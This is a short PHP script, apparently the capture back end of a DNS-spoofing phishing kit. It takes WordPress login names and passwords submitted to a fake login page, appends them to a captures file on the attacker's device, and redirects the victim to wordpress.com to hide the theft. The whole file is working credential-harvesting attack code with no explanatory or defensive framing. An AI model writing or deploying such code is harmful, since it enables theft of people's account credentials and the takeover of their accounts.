<?php

file_put_contents("/root/rpi_gui_map/DNSSpoof/captures/usernames.txt", "Wordpress Account: " . $_POST['log'] . " Pass: " . $_POST['pwd'] . "\n", FILE_APPEND);
header('Location: https://www.wordpress.com');
exit();
